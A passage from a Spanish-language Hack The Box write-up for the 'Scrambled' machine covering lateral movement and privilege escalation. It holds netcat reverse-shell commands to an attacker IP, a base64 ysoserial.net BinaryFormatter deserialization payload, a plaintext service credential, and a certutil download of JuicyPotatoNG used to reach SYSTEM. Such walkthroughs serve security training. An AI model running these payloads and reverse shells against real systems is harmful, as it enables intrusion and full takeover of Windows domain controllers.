$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
PS C:\Windows\system32> Invoke-Command -ComputerName dc1 -Credential $Cred -Command { whoami }
Invoke-Command -ComputerName dc1 -Credential $Cred -Command { whoami }
scrm\miscsvc
```

- Ahora vamos a ganar acceso.

```bash
PS C:\Windows\system32> Invoke-Command -ComputerName dc1 -Credential $Cred -ScriptBlock { C:\Temp\netcat.exe -e cmd 10.10.14.3 443 }
```

## User flag

- Ya podemos leer la flag.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.168] 61231
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\miscsvc\Documents>whoami
whoami
scrm\miscsvc

C:\Users\miscsvc\Documents>type C:\Users\miscsvc\Desktop\user.txt
type C:\Users\miscsvc\Desktop\user.txt
99e0ac7dcbc5c354ac0169f07630794d

C:\Users\miscsvc\Documents>
```

## Escalada de privilegios

- Vemos estos archivos interesantes.

```bash
C:\Shares\IT\Apps\Sales Order Client>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:\Shares\IT\Apps\Sales Order Client

05/11/2021  21:57    <DIR>          .
05/11/2021  21:57    <DIR>          ..
05/11/2021  21:52            86,528 ScrambleClient.exe
05/11/2021  21:52            19,456 ScrambleLib.dll
               2 File(s)        105,984 bytes
               2 Dir(s)  16,009,113,600 bytes free

C:\Shares\IT\Apps\Sales Order Client>
```

- Vamos a descargarlo mediante `smbclient.py`.

```bash
➜  content impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local -k
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use IT
# cd Apps\Sales Order Client
# ls
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 .
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 ..
-rw-rw-rw-      86528  Fri Nov  5 14:57:08 2021 ScrambleClient.exe
-rw-rw-rw-      19456  Fri Nov  5 14:57:08 2021 ScrambleLib.dll
# mget *
[*] Downloading ScrambleClient.exe
[*] Downloading ScrambleLib.dll
```

- Vamos a pasarlos a una maquina `Windows` para con `Dnspy` observar el código.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe.png">
</p>

- Si le damos en edit. vemos que esta corriendo en el puerto 4411.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe2.png">
</p>

- Al parecer parece un software de ordenes en la empresa.

```bash
➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
```

- Vamos analizar el código para ver que es lo que pasa por detrás.

- Y bueno ya vemos que emplea `Serialize` básicamente serializa la data y podemos modificar el input con un ataque de deserialización con base64.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial.png">
</p>

- Como dato extra si observamos en la parte del login si el usuario es scrmdev podemos entrar y al parecer aplica un Bypass vamos a entrar con ese usuario sin proporcionar contraseña.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial2.png">
</p>

- Lo que vamos hacer para ganar acceso es conectarnos con `netcat` y cuando eso pase enviar una data serializada pero necesitamos general un `payload` <https://github.com/pwntester/ysoserial.net/releases>.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/yserial.png">
</p>

- Vamos a crearlo en base64 en `BinaryFormatter` con su gadget.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/xd.png">
</p>

- Ahora nos ponemos en escucha.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
```

- Ahora nos conectamos y con `upload_order` como vimos en el código vamos a enviar nuestra data serializada.

```bash
➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA9AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMXdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQmpiV1FnTVRBdU1UQXVNVFF1TXlBME5ETWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs=
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
```

## root.txt

- Y ganamos acceso.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.168] 61761
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
5b18e5184ded3c7a33e509daf9e06b2e

C:\Windows\system32>
```

## Extra 

- Vamos a explotar una vía no intencionada <https://github.com/antonioCoco/JuicyPotatoNG>.

```bash
PS C:\Temp> certutil.exe -urlcache -f http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
certutil.exe -urlcache -f http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

PS C:\Temp> dir
dir


    Directory: C:\Temp


Mode                LastWriteTime         Length Name                   
----                -------------         ------ ----                   
-a----       01/05/2024     02:43         153600 JuicyPotato.exe        
-a----       30/04/2024     23:43          28160 netcat.exe             



PS C:\Temp>
```

- Ahora nos ponemos en escucha y nos enviamos la reverse Shell.

```bash
PS C:\Temp> ./JuicyPotato.exe -t * -p "C:\Temp\netcat.exe" -a '10.10.14.3 443 -e cmd'
./JuicyPotato.exe -t * -p "C:\Temp\netcat.exe" -a '10.10.14.3 443 -e cmd'
```

- Ganamos acceso.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.168] 61802
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system

C:\>hostname
hostname
DC1

C:\>
```
